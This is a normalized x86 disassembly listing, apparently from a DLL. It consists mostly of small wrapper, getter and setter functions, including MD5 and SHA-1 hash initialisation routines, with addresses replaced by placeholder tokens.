add esp 0xc
retn
sub_100255c0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ eax + 0xc ]
push ecx
push edx
call sub_1003c800
add esp 0x8
retn
sub_100258a0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_10040320
add esp 0x4
retn
sub_100258c0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push eax
mov eax [ edx + 0xc ]
push ecx
push eax
call sub_100400e0
add esp 0xc
retn
sub_100258e0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ eax + 0xc ]
push ecx
push edx
call sub_100401e0
add esp 0x8
retn
sub_10025900
mov eax r--data
retn
sub_10025910
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_10040cf0
add esp 0x4
retn
sub_10025930
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push eax
mov eax [ edx + 0xc ]
push ecx
push eax
call sub_10040d30
add esp 0xc
retn
sub_10025950
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ eax + 0xc ]
push ecx
push edx
call sub_10040f80
add esp 0x8
retn
sub_10025970
mov eax r--data
retn
sub_100259f0
mov eax r--data
retn
sub_10025a00
mov eax r--data
retn
sub_10025ab0
mov eax r--data
retn
sub_10025cd0
mov eax r--data
retn
sub_10025ef0
mov eax r--data
retn
sub_10026060
mov eax r--data
retn
sub_10026360
mov eax r--data
retn
sub_10026680
mov eax r--data
retn
sub_10026690
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ eax + 0x60 ]
push ecx
push edx
call sub_10047780
add esp 0x8
mov eax 0x1
retn
sub_100269a0
mov eax r--data
retn
sub_100269e0
mov eax rw-data
retn
sub_10028690
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push eax
add edx 0x6c
push ecx
push edx
call sub_1001f500
add esp 0xc
retn
sub_10028880
mov eax [ esp + 0x4 ]
retn
sub_10028f50
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov [ ecx + 0x20 ] eax
retn
sub_100294a0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
mov ecx [ eax + 0x1c ]
push ecx
call sub_1002d070
add esp 0x10
retn
sub_10029530
push 0x0
call sub_10029540
add esp 0x4
retn
sub_10029800
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x24 ]
retn
retn
sub_10029810
mov eax rw-data
retn
sub_1002a400
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_1002a420
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push r--data
push eax
push ecx
call sub_100325c0
add esp 0xc
retn
sub_1002a520
mov eax rw-data
retn
sub_1002b070
mov eax [ esp + 0x4 ]
push eax
mov ecx [ eax + 0x44 ]
call [ ecx + 0x4 ]
add esp 0x4
retn
sub_1002b080
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push edx
mov ecx [ eax + 0x44 ]
mov eax [ esp + 0xc ]
push eax
call [ ecx + 0x8 ]
add esp 0xc
retn
sub_1002b0a0
mov eax rw-data
retn
sub_1002b3f0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x1c ]
or ecx 0x1
mov [ eax + 0x1c ] ecx
mov eax 0x1
retn
sub_1002b410
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax 0x1
retn
push eax
call sub_1004c390
add esp 0x4
sub_1002b480
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_1002b4a0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push r--data
push eax
push ecx
call sub_100325c0
add esp 0xc
retn
sub_1002b4c0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_1002b4e0
mov eax [ esp + 0x4 ]
push eax
push r--data
call sub_1002a330
add esp 0x8
retn
sub_1002b5a2
add esp 0xc
add edi 0x10
push esi
push edi
push ebx
call sub_10043600
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_1002b5c0
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov eax [ ecx + 0x4 ]
retn
sub_1002b5d0
mov eax [ esp + 0x4 ]
mov eax [ eax + 0xc ]
retn
sub_1002b5e0
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x58 ]
retn
sub_1002b600
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x8 ]
retn
sub_1002bca0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push eax
add edx 0x4
push ecx
push edx
call sub_1002ab80
add esp 0xc
retn
sub_1002cb10
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x4 ]
retn
sub_1002cb50
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov [ ecx + 0x30 ] eax
retn
sub_1002cb70
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov [ ecx + 0x38 ] eax
retn
sub_1002e4b0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_1002e4d0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_1002e4f0
mov eax r--data
retn
sub_1002e500
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_1002ee80
mov eax r--data
retn
sub_1002ee90
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_1002eed0
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_1002eef0
mov eax r--data
retn
sub_1002ef00
mov eax r--data
retn
sub_1002ef10
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push r--data
push eax
push ecx
call sub_100325c0
add esp 0xc
retn
sub_1002ef30
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_1002ef50
mov eax r--data
retn
sub_1002ef60
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_1002ef80
push r--data
call sub_10033120
add esp 0x4
retn
sub_1002ef90
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_1002efb0
mov eax r--data
retn
sub_1002efc0
push r--data
call sub_10033120
add esp 0x4
retn
sub_1002efd0
mov eax r--data
retn
sub_1002efe0
mov eax r--data
retn
sub_1002eff0
mov eax r--data
retn
sub_1002f000
mov eax r--data
retn
sub_1002f010
mov eax r--data
retn
sub_1002f020
mov eax r--data
retn
sub_1002f030
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_1002f070
push r--data
call sub_10033120
add esp 0x4
retn
sub_1002f0a0
mov eax r--data
retn
sub_1002f0b0
mov eax r--data
retn
sub_1002f0c0
mov eax r--data
retn
sub_1002f0d0
mov eax r--data
retn
sub_1002f0e0
mov eax r--data
retn
sub_1002f0f0
mov eax r--data
retn
sub_1002f6e0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call sub_10022810
push eax
call sub_1004f1e0
add esp 0xc
retn
sub_1002f700
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call sub_10035070
push eax
call sub_1004f1e0
add esp 0xc
retn
sub_1002f780
mov eax [ esp + 0x4 ]
push eax
push rw-data
call sub_10050480
add esp 0x8
retn
sub_10030060
mov eax [ esp + 0x4 ]
mov eax [ eax ]
lea ecx [ eax + eax * 2 ]
lea eax [ eax + ecx * 4 ]
retn
sub_10030070
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov eax [ eax ]
mov edx [ ecx ]
sub eax edx
retn
sub_10030ea0
mov eax [ esp + 0x4 ]
test eax eax
jl r-xdata
xor eax eax
retn
cmp eax 0x1e
jg r-xdata
mov eax [ eax * 4 + r--data ]
retn
sub_10033160
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push 0x0
push eax
push ecx
call sub_10033180
add esp 0xc
retn
sub_10033860
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push 0x0
push eax
push ecx
call sub_10033880
add esp 0xc
retn
sub_10033d51
add [ esp + eax ] eax
add al 0x2
add edx [ eax - 0x6f6f6f70 ]
nop
nop
nop
nop
mov eax r--data
retn
sub_10033d70
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_10033d90
mov eax r--data
retn
sub_100340a0
mov eax r--data
retn
sub_100340b0
push r--data
call sub_10033120
add esp 0x4
retn
sub_100340c0
mov eax r--data
retn
sub_100340d0
mov eax r--data
retn
sub_100340e0
push r--data
call sub_10033120
add esp 0x4
retn
sub_100340f0
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_10034110
mov eax r--data
retn
sub_10034120
push r--data
call sub_10033120
add esp 0x4
retn
sub_10034130
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_10034150
mov eax r--data
retn
sub_10034160
push r--data
call sub_10033120
add esp 0x4
retn
sub_10034170
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_100344e0
cmp [ esp + 0x4 ] 0x3
jne r-xdata
mov eax 0x1
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push edx
call sub_10023940
add esp 0x4
sub_10034500
mov eax r--data
retn
sub_100347a0
mov eax rw-data
retn
sub_10034af0
fild [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
sub esp 0x8
fstp [ esp ]
push eax
push ecx
call sub_10034800
add esp 0x10
retn
sub_10034ff0
mov eax [ r--data ]
push eax
push rw-data
call sub_10050480
add esp 0x8
retn
sub_10035010
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x1c ]
retn
sub_10035020
mov eax r--data
retn
sub_10035060
mov eax r--data
retn
sub_10035070
mov eax r--data
retn
sub_10035080
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_100350c0
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov eax [ esp + 0x4 ]
mov edx [ ecx ]
mov ecx [ eax ]
push edx
mov edx [ ecx ]
push edx
call sub_1002ee40
add esp 0x8
retn
sub_10035160
mov eax r--data
retn
sub_10035520
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x4 ]
mov ecx [ eax ]
push edx
mov edx [ ecx + 0x4 ]
push edx
call sub_10030b10
add esp 0x8
retn
sub_10035540
mov eax r--data
retn
sub_10035560
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_10035580
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_100355a0
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_100363f0
push 0x0
call sub_10036400
add esp 0x4
retn
sub_10036640
mov eax r--data
retn
sub_10036650
mov eax r--data
retn
sub_10036660
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_10036680
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
push eax
call sub_1001e7b0
add esp 0x4
retn
retn
sub_10036740
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov eax [ eax ]
retn
retn
sub_10036750
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov edx [ eax + 0x4 ]
xor ecx ecx
test edx edx
setg cl
mov eax ecx
retn
retn
sub_10036770
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x24 ]
push edx
call sub_10036680
add esp 0x4
retn
sub_10036790
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push eax
mov eax [ edx ]
push ecx
mov ecx [ eax + 0x24 ]
push ecx
call sub_100366a0
add esp 0xc
retn
sub_100367b0
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
push eax
mov edx [ ecx ]
mov eax [ edx + 0x24 ]
push eax
call sub_10036710
add esp 0x8
retn
sub_10036800
mov eax r--data
retn
sub_10036810
mov eax r--data
retn
sub_10036820
push r--data
call sub_10033120
add esp 0x4
retn
sub_10036830
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_10036850
mov eax r--data
retn
sub_10036860
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_10036a40
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call sub_1002ee40
add esp 0x8
retn
sub_10036a60
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
call sub_1002ec90
add esp 0xc
retn
sub_10036a80
mov eax [ r--data ]
push eax
push rw-data
call sub_10050480
add esp 0x8
retn
sub_10036db0
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x10 ]
retn
sub_10036dc0
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov [ ecx + 0x10 ] eax
retn
sub_100397d0
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax ] 0x67452301
mov [ eax + 0x4 ] 0xefcdab89
mov [ eax + 0x8 ] 0x98badcfe
mov [ eax + 0xc ] 0x10325476
mov [ eax + 0x10 ] 0xc3d2e1f0
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x5c ] ecx
mov eax 0x1
retn
sub_100400d0
mov edx [ ecx ]
mov eax [ ecx + 0x4 ]
bswap edx
bswap eax
retn
sub_10040320
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax ] 0x67452301
mov [ eax + 0x4 ] 0xefcdab89
mov [ eax + 0x8 ] 0x98badcfe
mov [ eax + 0xc ] 0x10325476
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x58 ] ecx
mov eax 0x1
retn
sub_10047760
mov ecx [ esp + 0x4 ]
xor eax eax
xor edx edx
mov dl [ eax + ecx ]
inc eax
cmp eax 0x8
mov dl [ edx + r--data ]
mov [ eax + ecx - 0x1 ] dl
jb r-xdata
retn
sub_10048320
mov eax r--data
retn
sub_10048900
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
test eax eax
je r-xdata
retn
test [ eax ] 0x8
je r-xdata
push ecx
call sub_1001d740
pop ecx
sub_100492a0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
push 0x0
call sub_100492c0
add esp 0x14
retn
sub_10049480
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
push 0x1
call sub_100492c0
add esp 0x14
retn
sub_10049680
mov eax rw-data
retn
sub_1004aa90
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x3c ]
or ecx 0x6
mov [ eax + 0x3c ] ecx
mov eax 0x1
retn
sub_1004aaf0
mov eax [ r--data ]
push eax
push rw-data
call sub_10050480
add esp 0x8
retn
sub_1004ab10
mov eax r--data
retn
sub_1004ab20
mov eax r--data
retn
sub_1004ab30
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov ecx [ eax + 0x14 ]
mov eax 0x1
mov [ edx ] ecx
retn
sub_1004ab50
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ edx ] ecx
retn
sub_1004ac80
mov eax r--data
retn
sub_1004ac90
mov eax r--data
retn
sub_1004aca0
call sub_100299b0
mov ecx [ esp + 0x4 ]
xor edx edx
test eax eax
setne dl
mov [ ecx ] eax
mov eax edx
retn
sub_1004bec0
mov eax [ esp + 0x4 ]
push eax
push rw-data
call sub_10050480
add esp 0x8
retn
sub_1004d8c0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_1004d8e0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push r--data
push eax
push ecx
call sub_100325c0
add esp 0xc
retn
sub_1004d900
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_1004d920
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
mov eax [ eax ]
retn
cmp [ eax ] 0x5
je r-xdata
xor eax eax
retn
sub_1004ebb0
mov eax [ esp + 0x4 ]
push sub_1004e450
push sub_1004e3f0
push sub_1004e3d0
mov ecx [ eax + 0x44 ]
push ecx
call sub_1002d070
add esp 0x10
neg eax
sbb eax eax
neg eax
retn
sub_1004ef10
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_1004ef30
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push r--data
push eax
push ecx
call sub_100325c0
add esp 0xc
retn
sub_1004ef50
push r--data
call sub_10033120
add esp 0x4
retn
sub_1004ef60
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_1004ef80
push 0x4c
push r--data
push 0x8
call sub_1001d4c0
add esp 0xc
test eax eax
jne r-xdata
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
retn
retn
sub_1004eff0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push edx
mov ecx [ eax + 0x3c ]
mov eax [ esp + 0xc ]
push eax
call [ ecx + 0x4 ]
add esp 0xc
retn
sub_1004f010
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x4 ]
push edx
mov edx [ esp + 0x10 ]
mov ecx [ eax + 0x3c ]
push edx
mov edx [ esp + 0x10 ]
push edx
push eax
call [ ecx + 0x8 ]
add esp 0x10
retn
sub_1004f030
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
push edx
mov ecx [ eax + 0x3c ]
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
push edx
call [ ecx + 0xc ]
add esp 0x10
retn
sub_1004f1c0
mov eax r--data
retn
sub_1004f1d0
mov eax r--data
retn
sub_1004f440
mov eax r--data
retn
sub_1004f450
mov eax r--data
retn
sub_1004f460
mov eax r--data
retn
sub_1004f470
cmp [ esp + 0x4 ] 0x3
jne r-xdata
mov eax 0x1
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x1c ]
push edx
call sub_10023940
add esp 0x4
sub_1004f490
mov eax r--data
retn
sub_1004f4a0
mov eax r--data
retn
sub_1004f4b0
mov eax r--data
retn
sub_1004f4c0
cmp [ esp + 0x4 ] 0x3
jne r-xdata
mov eax 0x1
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x10 ]
push edx
call sub_10022870
add esp 0x4
sub_1004f4e0
mov eax r--data
retn
sub_1004f4f0
mov eax r--data
retn
sub_1004f500
mov eax r--data
retn
sub_1004f510
mov eax r--data
retn
sub_1004f520
mov eax r--data
retn
sub_1004f530
mov eax r--data
retn
sub_1004f540
mov eax r--data
retn
sub_1004f550
mov eax r--data
retn
sub_1004f560
mov eax r--data
retn
sub_1004f570
mov eax r--data
retn
sub_1004f580
mov eax r--data
retn
sub_1004f590
mov eax r--data
retn
sub_1004f5a0
mov eax r--data
retn
sub_100505b0
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ edx ]
mov eax [ ecx + eax ]
retn
sub_100505d0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ edx ]
mov edx [ esp + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov [ ecx ] edx
retn
sub_100507f0
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
test ch 0x4
je r-xdata
mov ecx [ esp + 0x4 ]
mov eax [ eax + 0x8 ]
add eax [ ecx ]
retn
mov eax [ esp + 0x4 ]
retn
sub_10051630
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push 0x0
push eax
push ecx
push edx
push 0x0
call sub_10051650
add esp 0x14
retn
sub_10052290
mov eax r--data
retn
sub_100522a0
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_100526e0
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov eax [ esp + 0x4 ]
mov edx [ ecx ]
mov ecx [ eax ]
push edx
mov edx [ ecx ]
push edx
call sub_10030b10
add esp 0x8
retn
sub_10052720
mov eax r--data
retn
sub_10052730
mov eax r--data
retn
sub_10052740
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_10052760
mov eax r--data
retn
sub_10052770
mov eax r--data
retn
sub_10052780
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_100527a0
mov eax r--data
retn
sub_100527b0
mov eax r--data
retn
sub_10054b50
mov eax rw-data
retn
sub_10055470
mov eax [ r--data ]
push eax
push rw-data
call sub_10050480
add esp 0x8
retn
sub_10055490
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x18 ]
retn
sub_100554a0
mov eax rw-data
retn
sub_10055c30
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x28 ]
or ecx 0x1
mov [ eax + 0x28 ] ecx
mov eax 0x1
retn
sub_10055c50
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
mov eax 0x1
retn
push eax
call sub_1004c390
add esp 0x4
sub_10055c70
mov eax [ r--data ]
push eax
push rw-data
call sub_10050480
add esp 0x8
retn
sub_10055c90
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ eax ]
mov eax [ edx ]
mov ecx [ ecx ]
mov edx [ eax ]
sub ecx edx
mov eax ecx
retn
sub_100585b0
mov eax r--data
retn
sub_100585c0
mov eax r--data
retn
sub_100585d0
mov eax r--data
retn
sub_100585e0
mov eax r--data
retn
sub_10058d90
push sub_10058da0
call sub_1001e440
add esp 0x4
retn
sub_10058f50
mov eax [ esp + 0x4 ]
push eax
call sub_1001d740
pop ecx
retn
sub_10058f60
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
test [ eax + 0x14 ] 0x2
je r-xdata
retn
mov eax [ eax + 0x10 ]
retn
mov eax [ eax + 0xc ]
retn
sub_10059b90
mov al [ rw-data ]
neg al
sbb eax eax
and eax rw-data
retn
sub_10059e60
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax + 0x4 ] 0x1e
mov [ eax ] ecx
mov [ eax + 0x58 ] ecx
mov [ eax + 0x5c ] ecx
retn
sub_1005aa10
mov eax r--data
retn
sub_1005aa20
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_10061a00
add esp 0x4
xor ecx ecx
mov [ esi + 0x9c ] ecx
mov [ esi + 0xa0 ] ecx
pop esi
retn
sub_1005aea0
mov eax r--data
retn
sub_1005aeb0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
mov edx [ eax + 0xa4 ]
mov [ ecx + 0xa4 ] edx
call sub_10061a70
add esp 0x8
retn
sub_1005b1a0
mov eax r--data
retn
sub_1005b4f0
mov eax [ esp + 0x4 ]
add eax 0x48
push eax
call sub_10029870
add esp 0x4
dec eax
retn
sub_1005b7a0
push 0x49
push r--data
push 0x45
push 0xa4
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1005c100
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
mov eax [ esp + 0x10 ]
push eax
push eax
push ecx
push edx
call sub_1005bd30
add esp 0x14
retn
sub_1005c180
mov ecx [ esp + 0x8 ]
xor eax eax
mov edx [ ecx + 0x30 ]
test edx edx
sete al
retn
sub_1005c610
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
add ecx 0x5c
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call sub_10066600
add esp 0x10
retn
sub_1005c660
mov eax rw-data
retn
sub_1005c940
mov eax [ r--data ]
push eax
push rw-data
call sub_10050480
add esp 0x8
retn
sub_1005c960
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x14 ]
retn
sub_1005d400
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov eax [ eax ]
push eax
call sub_1001e7b0
add esp 0x4
retn
retn
sub_1005e6d0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
call sub_10067e40
add esp 0xc
retn
sub_1005e6f0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call sub_10067de0
add esp 0x8
retn
sub_1005e710
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
call sub_10067ca0
add esp 0xc
retn
sub_1005e730
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call sub_10067c00
add esp 0x8
retn
sub_1005e750
mov eax r--data
retn
sub_1005e760
mov eax r--data
retn
sub_1005eff0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call sub_100562e0
add esp 0x8
retn
sub_1005f010
mov eax r--data
retn
sub_1005f020
mov eax r--data
retn
j_sub_1002ef80
jmp sub_1002ef80
sub_1005ff00
mov eax [ esp + 0x4 ]
push eax
call sub_1002ee10
pop ecx
retn
sub_1005ff50
mov eax 0x1
retn
j_sub_1002efc0
jmp sub_1002efc0
sub_10060050
mov eax r--data
retn
sub_10060190
mov eax r--data
retn
sub_100601a0
mov eax r--data
retn
sub_10060710
mov eax r--data
retn
sub_10060720
mov eax r--data
retn
sub_10060730
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_10060750
mov eax r--data
retn
sub_10060b20
mov eax r--data
retn
sub_10060dc0
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov edx [ eax + 0x8 ]
push ecx
push edx
call sub_10056ea0
add esp 0x8
retn
sub_100617d0
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ ecx ]
test eax eax
jle r-xdata
cmp eax 0x2
jg r-xdata
mov eax [ ecx + 0xc ]
retn
sub_100617f0
mov ecx [ esp + 0x4 ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
sub eax 0x2
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x18 ]
retn
xor eax eax
retn
sub_10061d90
mov eax [ esp + 0x4 ]
add eax 0x48
push eax
call sub_10029870
add esp 0x4
retn
sub_10062030
mov eax [ esp + 0x8 ]
push 0x0
mov [ eax + 0x40 ] 0x0
add eax 0x2c
push eax
call sub_10029cf0
add esp 0x8
mov eax 0x1
retn
sub_10064430
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
add ecx 0x48
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call sub_10057bb0
add esp 0x10
retn
sub_10064450
mov eax r--data
retn
sub_10064460
mov eax r--data
retn
sub_10064470
mov eax r--data
retn
sub_10064480
mov eax r--data
retn
sub_10064490
mov eax r--data
retn
sub_10065f00
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call sub_1004e6d0
add esp 0x8
retn
sub_10065f20
mov eax [ esp + 0x4 ]
push eax
call sub_1004ebb0
add esp 0x4
retn
sub_10067990
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
inc ecx
mov [ eax ] ecx
mov eax 0x1
retn
sub_100679a0
mov eax [ esp + 0x4 ]
push eax
push 0xffffffff
push 0x0
